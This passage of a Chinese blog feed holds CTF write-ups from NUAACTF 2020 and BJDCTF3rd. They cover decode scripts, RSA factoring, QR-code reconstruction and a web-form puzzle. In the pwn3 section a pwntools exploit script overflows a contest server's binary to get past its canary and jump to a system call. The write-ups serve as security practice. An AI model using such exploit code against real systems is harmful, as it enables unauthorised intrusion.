src="/2020/05/30/CTF_2020NUAACTF/image-20200530135109666.png" alt="re2-1"></p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530135033544.png" alt="re2-2"></p><p>python 写一波jio本。</p><p><strong>Exp：</strong></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span>m <span class="token operator">=</span> r<span class="token string">"W1og39p2Kp+2_Zpx2{/yF"</span>s <span class="token operator">=</span> r<span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!@#$%^&amp;*()_+"</span>e <span class="token operator">=</span> r<span class="token string">"oLlQfWgThE_1-ZpsUHMS+ex6K\tP{9I}Jn8C4/kmcd5yBAz0RDaVrwuGvNjqOYi===========2b"</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">:</span>    index <span class="token operator">=</span> e<span class="token punctuation">.</span>find<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print(e.find(i))</span>    <span class="token keyword">if</span> index <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>        single <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># print(single)</span>        flag <span class="token operator">+=</span> single<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># flagDo_you_know_CLR</span></code></pre><p><em>（exp中没有写<code>{</code> <code>}</code>的对应关系，问题不大</em></p><p>得到 flag:</p><p><code>flag{Do_you_know_CLR}</code></p><br><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto1-贝斯"><a href="#Crypto1-贝斯" class="headerlink" title="Crypto1-贝斯"></a>Crypto1-贝斯</h3><p>base64 一波完事</p><h3 id="crypto4-RREAL-RSA"><a href="#crypto4-RREAL-RSA" class="headerlink" title="crypto4-RREAL_RSA"></a>crypto4-RREAL_RSA</h3><p>哇呜，有直接了当的 RSA！</p><pre><code>Public key:e=65537, n=1106081963347301781444155926534938643298217639670251381867474826890728970307Encrypted flag:c=681873475888907291485502809441689140305197371659486141705279050132490452420</code></pre><p>大整数N分解得到两个质数：</p><p>6598638704725743849027686163703739789</p><p>167622749606696848477732277529837832463</p><blockquote><p>本地跑了半天没跑出来，拿去 <a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a> 这里分解就好了。</p></blockquote><p>计算D再解密C即可得到flag</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530140248121.png" alt="crypto4"></p><p><code>flag{Here_Is_R4a1_Rs@}</code></p><br><hr><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>按刘师傅意思，果然有签到题。</p><p>直接nc就出来了</p><p><img src="/2020/05/30/CTF_2020NUAACTF/pwn1.png" alt="pwn1"></p><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>改<code>v2</code>绕过 cannary</p><p>把<code>v2</code>改成 0x40</p><p><img src="/2020/05/30/CTF_2020NUAACTF/pwn3-1.png" alt="pwn3-1"></p><p><img src="/2020/05/30/CTF_2020NUAACTF/pwn3-2.png" alt="pwn3-2"></p><p><img src="/2020/05/30/CTF_2020NUAACTF/pwn3-3.png" alt="pwn3-3"></p><p><strong>Exp:</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>c <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'49.235.243.206'</span><span class="token punctuation">,</span> <span class="token number">10503</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#c = process('./33')</span><span class="token comment" spellcheck="true">#gdb.attach(c)</span>sysaddr <span class="token operator">=</span> <span class="token number">0x004007FB</span>payload <span class="token operator">=</span> <span class="token string">''</span>payload <span class="token operator">+=</span>p64<span class="token punctuation">(</span>sysaddr<span class="token punctuation">)</span>c<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>c<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530203847885.png" alt="pwn3-flag"></p><br><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>其实现在感觉做出来的题目还算很常规的，大都是常用的套路罢了。</p><p>毕竟是校赛，本身校内玩这个的也不多，题目的话自然相对于外面而言友好多了。</p><p>不过话说回来，这次比赛难度稍大的题目还是挺有意思的，甚至网上还没有过相关的思路，出题师傅们也挺费心血了。</p><p>有的题目有了思路，现场查了半天资料还做不出 flag 来，这时候就挺绝望的。</p><p><del>（还有比如为了一个题用 http3 装了几个小时 curl 到比赛结束都没装上，代码半天拉不下来气死我了</del></p><p>还要感谢队友一起冲呀！也算是一个小心愿实现了吧嘻嘻嘻。</p><p>可能这就是 CTF 的魅力吧。</p><p>就先这样了8，后面有空再来复现喵~</p><p>（溜了喵</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | DASCTF May &amp; BJDCTF3rd 部分WriteUp</title>
      <link href="/2020/05/24/CTF_BJDCTF3rd/"/>
      <url>/2020/05/24/CTF_BJDCTF3rd/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p><img src="/2020/05/24/CTF_BJDCTF3rd/poster.jpg" alt="poster"></p><p>哇呜，转眼间一个月又过去了。这个月事情挺多的，当然也比较懒，一直咕着没来更新博客。</p><p>前两天水了一下 DASCTF 五月赛 &amp; BJDCTF3rd，这次不是新生赛了，还是和企业合办的，于是难度大的亚批，打得都自闭了。（没理由吹新生赛了嘤嘤嘤。</p><p>有一种好久没打 CTF 的感觉，这次上手挺生疏的（？</p><p>题目看上去挺多的，确实也是，然而就不怎么会做嘛。（摊手</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/8VHqaqGQuOoT84iw.png" alt="题目"></p><p>官方问题汇总文档<a href="https://shimo.im/docs/KJypgTpQgRdxQ6tY/read" target="_blank" rel="noopener">见这里</a>。（包括 hint 等）</p><p>这次主要来看看 Misc 题吧，其他的随意看看好了。<small><del>（反正也不会做</del></small></p><p>比赛结束后题目环境已经关了，随便写写8.</p><br><hr><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="blink"><a href="#blink" class="headerlink" title="blink"></a>blink</h3><blockquote><p>一闪一闪亮晶晶~(请将flag经过md5后提交) </p><p>hint1: 完整的图案可以扫一扫 </p><p>hint2: <a href="http://taqini.space/2020/04/30/shell-output-control-code" target="_blank" rel="noopener">http://taqini.space/2020/04/30/shell-output-control-code</a></p><p>hint3: 此题有多种解法，不一定要硬把flag逆出来</p></blockquote><p>这题本来是想逆向解的，就是他用了不少输出控制码，看了一下挺复杂的。</p><p>可以扫一扫，明确就是二维码之类的了。</p><p>一闪一闪的，突然想到截图然后叠加就好了呀！</p><p>断开连接后再一看，他的实现是一屏一屏刷的，每一次记录都保留在终端里，<strong>直接终端里复制结果，再写个 jio 本就好了呀！</strong></p><p><strong>Exp：</strong></p><p>python大法好呀！</p><p>我这里分别复制了10次闪烁的结果到文件里，考虑10次应该够了。</p><p>图形是25*25的，用一个矩阵来存是0还是1.</p><p>之后再转换到 [0, 255] uint8 类型，用 PIL 作图好了。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> numpy <span class="token keyword">as</span> nptable <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>int<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(table)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'{}.txt'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>        row <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">while</span> row <span class="token operator">&lt;</span> <span class="token number">25</span><span class="token punctuation">:</span>            line <span class="token operator">=</span> fin<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> line<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'x'</span><span class="token punctuation">:</span>                    table<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>            row <span class="token operator">+=</span> <span class="token number">1</span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">255</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> row<span class="token punctuation">]</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> table<span class="token punctuation">]</span>qrcode <span class="token operator">=</span> Image<span class="token punctuation">.</span>fromarray<span class="token punctuation">(</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">(</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>qrcode<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>qrcode<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'qrcode.png'</span><span class="token punctuation">)</span></code></pre><p>这里图片反色了还有点小啊哈哈哈。问题不大，放大来扫就是了。</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/qrcode.png" alt="qrcode"></p><p>扫码得到</p><p><code>BJD{TW1NKLE_TW1NKLE_L1TTLE_5TAR}</code></p><p>真是一闪一闪亮晶晶~</p><p>MD5 后得到</p><p><code>e1eded5a7f630a2d02d3fe17b786919a</code></p><p>哇好耶，这题好难得啊，是 17 个做出来的之一唉。</p><br><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Questionnaire"><a href="#Questionnaire" class="headerlink" title="Questionnaire"></a>Questionnaire</h3><blockquote><p> 叮~ 您有一份调查问卷~ 请查收~  <a href="https://forms.gle/Vmzt99LazrtXsRLM9" target="_blank" rel="noopener">https://forms.gle/Vmzt99LazrtXsRLM9</a></p></blockquote><blockquote><p>flag格式：32位字符串</p><p>关于问卷问题答案：请使用英文或拼音作答。</p><p>问卷第七题hint</p><p>离中国科学院大学最近的长城</p><p>答案为长城名字的拼音，例如:</p><p>Badaling</p><p>答对每题都会提示flag的一部分</p><p>Flag一共7部分</p><p>除了大学和公园外</p><p>其余题目都是拼音</p></blockquote><p>这是什么签到题？？？</p><p>最开始以为是填了之后放flag的，发现并不是。</p><p>填了几个发现错误提示，和 TaQini 师傅 py 了一下，果然是一个题给一部分 flag，最后连起来。（不过到最后也放 hint 了哈哈哈</p><p>借助百度识图、搜狗识图、谷歌识图，好不容易才整明白是啥。。（感觉找个老北京人要快得多呢2333</p><p>图片分别对应着：</p><blockquote><p>BIT 北理工 d41d</p><p>好邻居 8cd9</p><p>稻香村 8f00b2</p><p>jingweizhai 04e9</p><p>Jingshan Park 景山公园 8009</p><p>chaoyang 朝阳 98ecf8</p><p>hefangkou 河防口 427e </p></blockquote><p><em>（最后这个长城查了半天，搜索引擎告诉我怀柔区的长城是慕田峪（确实）。。后来和 TaQini 师傅聊到说这是个鲜为人知的长城……</em></p><p>连起来得到 flag：</p><p><code>d41d8cd98f00b204e9800998ecf8427e</code></p><p>P.S.: 后面查不出来在网页里一搜，发现还是谷歌的套路，是用 JavaScript 传入的数据。里面就有匹配的逻辑了。</p><p>（还是 F12 大法好呀！</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522231643959.png" alt="js"></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> FB_PUBLIC_LOAD_DATA_ <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Let's see how well you know our Capital."</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1790362738</span><span class="token punctuation">,</span><span class="token string">"What is the name of this university?"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">336510603</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Beijing Institute of Technology|BIT"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"d41d"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"1vV5T8FOS13NOQDji-xYIynLwsUMXcV8aatxUWP6ljvfz-w"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">740</span><span class="token punctuation">,</span><span class="token number">416</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">603160739</span><span class="token punctuation">,</span><span class="token string">"What is the name of the store?"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">539054317</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Haolinju|haolinju"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"8cd9"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"1x4dT2M6J3EbaiVZ37ssMVunsnsB2UMCM6g4LCHyhlHJu-Q"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">740</span><span class="token punctuation">,</span><span class="token number">416</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">488094967</span><span class="token punctuation">,</span><span class="token string">" What BRAND is this food?"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1465781074</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Daoxiangcun|daoxiangcun"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"8f00b2"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"1lH3bwgs28QoVKcUYhtzoqAcacmh4n4CHyWjGQen4RiE3Jw"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">375</span><span class="token punctuation">,</span><span class="token number">458</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1097246628</span><span class="token punctuation">,</span><span class="token string">"Which RESTAURANT are the ducks coming from? "</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">353762320</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Jingweizhai|jingweizhai"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"04e9"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"11ym4QgB0WEymoJXlmFy7FTC5Eyd5rV1adBbw6vWN5PmXvw"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">740</span><span class="token punctuation">,</span><span class="token number">555</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1916058196</span><span class="token punctuation">,</span><span class="token string">"Which PARK is this?"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">901636349</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Jingshan|jingshan"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"8009"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"16pfH3k5-5kDo-Rb9BxeKRvx0S-Qy4IgUdlX8iJ0AUOBIwQ"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">740</span><span class="token punctuation">,</span><span class="token number">554</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1044111735</span><span class="token punctuation">,</span><span class="token string">"Which DISTRICT is the No.3 of Beijing?"</span><span class="token punctuation">,</span><span class="token string">"The restaurant in question4 is in this Distric"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1620980704</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Chaoyang|chaoyang"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"98ecf8"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"1VbfGqSSHlM9D_HY1TsENa6rle3axBYbtKdyHS_klYDLG5g"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">740</span><span class="token punctuation">,</span><span class="token number">371</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1877231084</span><span class="token punctuation">,</span><span class="token string">"Which part of the Great Wall is this?"</span><span class="token punctuation">,</span><span class="token string">"In Huairou Distric"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1337434564</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Hefangkou|hefangkou"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"427e"</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">//...</span></code></pre><br><hr><h3 id="bin-cat-2"><a href="#bin-cat-2" class="headerlink" title="/bin/cat 2"></a>/bin/cat 2</h3><blockquote><p>[CAUTION] cats as numerous as stars are coming… 解出的答案经md5后提交~</p></blockquote><p><img src="/2020/05/24/CTF_BJDCTF3rd/2005205ec4f1a07a3e9.gif" alt="2005205ec4f1a07a3e9"></p><p>有两种喵喵，还是动图唉，远着看就是二维码嘛！<em>（果然是 TaQini 师傅出的题</em></p><p>首先把宽度压缩到原来一半，本来想 python 写个jio本的，PIL 感觉有点麻烦还不大会。</p><p>于是一波骚操作重新上个色好了。（你肯定想不到我是在 word 中处理的吧，嘿嘿嘿</p><p>PS 也行，Stegsolve 里 gif 截取一帧然后丢去取某通道某 bit 信息/随机上色/etc. 都行。</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522212913109.png" alt="重新上色"></p><p>扫码得到</p><p><code>m1ao~miao~mi@o~Mia0~m!aO~m1a0~~~</code></p><p>喵喵喵喵喵喵~</p><p>md5加密得到32位flag。</p><p><code>9b84eb9e7107ffafebeb1000e8c05322</code></p><p><em>（看到还真有手搓二维码的 tql</em></p><br><hr><h3 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test your nc"></a>test your nc</h3><blockquote><p> 183.129.189.60:10118,10119,10120,10121,10122,10123</p></blockquote><blockquote><p>hint1: /f1a9.bak 你看到了嘛? </p><p>hint2: 用df命令看看硬盘总共多大，再看看flag多大。</p><p>hint3: 系统命令不够使？试试万能的python</p></blockquote><p>先来看看 <code>/f1a9.bak</code>。</p><pre class=" language-bash"><code class="language-bash">$ <span class="token function">cat</span> /f1a9.bak<span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true">#coding=utf-8</span>from random <span class="token function">import</span> randintfrom uuid <span class="token function">import</span> uuid4flag <span class="token operator">=</span> <span class="token punctuation">[</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span>2:-1<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span>.fields<span class="token punctuation">]</span>f<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'/home/ctf/flag'</span>,<span class="token string">'w'</span><span class="token punctuation">)</span>f.write<span class="token punctuation">(</span><span class="token string">'🐀'</span><span class="token punctuation">)</span>f.seek<span class="token punctuation">(</span>1024*1024*1024<span class="token punctuation">)</span>f.write<span class="token punctuation">(</span><span class="token string">'flag{'</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> 1024<span class="token keyword">for</span> i <span class="token keyword">in</span> flag:    f.seek<span class="token punctuation">(</span>1024*1024*1024*randint<span class="token punctuation">(</span>offset,offset+2048<span class="token punctuation">))</span>    offset +<span class="token operator">=</span> 2048    f.write<span class="token punctuation">(</span>i<span class="token punctuation">)</span>f.write<span class="token punctuation">(</span><span class="token string">'}'</span><span class="token punctuation">)</span>f.seek<span class="token punctuation">(</span>1024*1024*1024*randint<span class="token punctuation">(</span>offset,offset+2048<span class="token punctuation">))</span>f.write<span class="token punctuation">(</span><span class="token string">'good job!'</span><span class="token punctuation">)</span>f.close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这里的<code>uuid</code>正好就查了一下。</p><blockquote><p>UUID: 通用唯一标识符 ( Universally Unique Identifier ),  对于所有的UUID它可以保证在空间和时间上的唯一性. 它是通过MAC地址, 时间戳, 命名空间, 随机数,  伪随机数来保证生成ID的唯一性, 有着固定的大小( 128 bit ).  它的唯一性和一致性特点使得可以无需注册过程就能够产生一个新的UUID. UUID可以被用作多种用途, 既可以用来短时间内标记一个对象,  也可以可靠的辨别网络中的持久性对象.</p></blockquote><blockquote><p>python 的 uuid 模块提供UUID类和函数uuid1(), uuid3(), uuid4(), uuid5() 来生成1, 3,  4, 5各个版本的UUID ( 需要注意的是: python中没有uuid2()这个函数). 对uuid模块中最常用的几个函数总结如下: </p><ol><li><p>uuid.uuid1([node[, clock_seq]]) : 基于时间戳</p><p>使用主机ID, 序列号, 和当前时间来生成UUID, 可保证全球范围的唯一性. 但由于使用该方法生成的UUID中包含有主机的网络地址, 因此可能危及隐私. 该函数有两个参数, 如果 node 参数未指定, 系统将会自动调用 getnode() 函数来获取主机的硬件地址.  如果 clock_seq  参数未指定系统会使用一个随机产生的14位序列号来代替. </p></li><li><p>uuid.uuid3(namespace, name) : 基于名字的MD5散列值</p><p>通过计算命名空间和名字的MD5散列值来生成UUID, 可以保证同一命名空间中不同名字的唯一性和不同命名空间的唯一性, 